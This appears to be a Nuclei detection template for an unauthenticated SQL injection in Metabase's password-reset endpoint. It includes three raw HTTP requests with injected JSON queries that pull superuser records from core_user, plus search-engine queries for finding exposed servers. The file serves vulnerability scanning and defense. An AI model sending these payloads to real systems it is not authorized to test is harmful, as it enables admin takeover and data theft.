id: metabase-sqli-reset-password

info:
  name: Metabase SQLi - Unauthenticated Reset Password
  author: 0x_Akoko,pdteam
  severity: critical
  description: |
    Detected Metabase unauthenticated SQL injection in POST /api/session/reset_password that allows attackers to gain admin access. An unauthenticated attacker can inject SQL into the Metabase application database, gain admin privileges, steal stored database credentials, and exfiltrate data from all connected databases.
  reference:
    - https://github.com/metabase/metabase/security/advisories/GHSA-vwf4-m7j8-wcjf
    - https://securityonline.info/metabase-sql-injection-zero-day-exploited/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-89
  metadata:
    verified: true
    max-request: 3
    shodan-query: http.title:"Metabase"
    fofa-query: title="Metabase"
    product: metabase
    vendor: metabase
  tags: sqli,metabase,honeysql,unauth

flow: http(1) && http(2) && http(3)

http:
  - raw:
      - |
        POST /api/session/reset_password HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
 
        {"token":{"select":1},"password":"TestPassword1!"}

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 400'
          - 'contains_all(body, "should be a string", "{:select 1}")'
        condition: and
        internal: true

  - raw:
      - |
        POST /api/session/reset_password HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"token":{"select":["email","id"],"from":["core_user"],"where":["=","is_superuser",true],"limit":1},"password":"TestPassword1!"}

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 400'
          - 'contains_all(body, "is_superuser", "core_user")'
        condition: and
        internal: true

  - raw:
      - |
        POST /api/session/reset_password HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"token":"1_0000","password":"TestPassword1!","user-id":{"select":["id"],"from":["core_user"],"where":["=","is_superuser",true],"limit":1}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 400'
          - 'contains(body, "Invalid reset token")'
          - '!contains(body, "disallowed key")'
        condition: and
